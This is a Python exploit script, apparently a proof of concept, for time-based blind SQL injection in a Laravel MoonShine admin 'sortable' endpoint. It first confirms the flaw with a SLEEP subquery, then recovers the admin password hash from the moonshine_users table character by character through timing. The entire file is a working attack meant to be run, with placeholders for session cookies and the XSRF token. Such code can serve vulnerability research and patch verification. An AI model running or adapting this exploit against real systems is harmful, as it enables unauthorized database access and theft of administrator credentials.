import requests
import time
import string
from urllib.parse import quote

# Configurazione
TARGET_URL = "http://localhost/admin/category-resource/sortable"
DELAY_THRESHOLD = 5
VERIFY_SSL = False

# Headers
HEADERS = {
    "Host": "localhost",
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryuLTeqJXF3L06Er3R",
    "X-Requested-With": "XMLHttpRequest",
    "Cookie": "XSRF-TOKEN=<REPLACE_COOKIE>; laravel_session=<REPLACE_COOKIE>",
    "X-XSRF-TOKEN": "<REPLACE_TOKEN>"
}

def build_payload(injection):
    boundary = "----WebKitFormBoundaryuLTeqJXF3L06Er3R"
    payload = f"""--{boundary}
Content-Disposition: form-data; name="id"

1
--{boundary}
Content-Disposition: form-data; name="parent"

1
--{boundary}
Content-Disposition: form-data; name="index"

1
--{boundary}
Content-Disposition: form-data; name="data"

{injection}
--{boundary}--"""
    return payload

def send_request(payload):
    try:
        response = requests.post(
            TARGET_URL,
            headers=HEADERS,
            data=payload,
            verify=VERIFY_SSL,
            timeout=DELAY_THRESHOLD-1
        )
        return response
    except requests.exceptions.Timeout:
        return None
    except requests.exceptions.RequestException as e:
        print(f"[-] Error: {e}")
        return None

def is_vulnerable():
    injection = "(SELECT 1 FROM moonshine_users WHERE SLEEP(5))"
    payload = build_payload(injection)

    start = time.time()
    send_request(payload)
    elapsed = time.time() - start
    print(f"Elapsed time: {elapsed * 1000:.2f} ms")

    return elapsed >= DELAY_THRESHOLD-1

def extract_admin_password(user_id=1):
    charset = string.ascii_letters + string.digits + "$."
    password = ""
    pos = 1
    while(True):
        char_found = False

        for char in charset:
            safe_char = quote(char) if char in {'"', "'", "\\"} else char
            injection = f"(SELECT password FROM moonshine_users WHERE id={user_id} AND BINARY SUBSTRING(password FROM {pos} FOR 1)='{safe_char}' AND SLEEP({DELAY_THRESHOLD}))"
            payload = build_payload(injection)
            start_time = time.time()
            response = send_request(payload)

            if response is None:
                if time.time() - start_time >= DELAY_THRESHOLD-1:
                    password += char
                    pos += 1
                    print(f"[+] Character {pos}: '{char}' - Hash: '{password}'")
                    char_found = True
                    break

        if not char_found:
            print(f"[*] Hash dumped correctly!")
            break

    return password if password else None

def main():
    print("[*] Verifing SQLi time-based...")
    if not is_vulnerable():
        print("[-] Target not vulnerable")
        return

    print("[+] Target vulnerable!")

    print("\n[*] Dumping admin password...")
    password = extract_admin_password(1)

    if password:
        print(f"\n[+] Admin password hash extracted: '{password}'")
    else:
        print("[-] Dump failed!")

if __name__ == "__main__":
    main()
